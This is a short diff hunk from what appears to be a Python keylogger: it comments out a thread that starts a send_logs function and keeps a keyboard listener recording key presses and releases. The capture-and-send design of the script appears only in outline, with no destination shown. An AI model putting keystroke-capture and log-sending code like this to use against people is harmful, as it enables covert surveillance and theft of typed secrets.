@@ -183,8 +183,8 @@ def send_logs():
 
 # Start Listener
 if __name__ == '__main__':
-    T1 = threading.Thread(target=send_logs)
-    T1.start()
+    #T1 = threading.Thread(target=send_logs)
+    #T1.start()
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
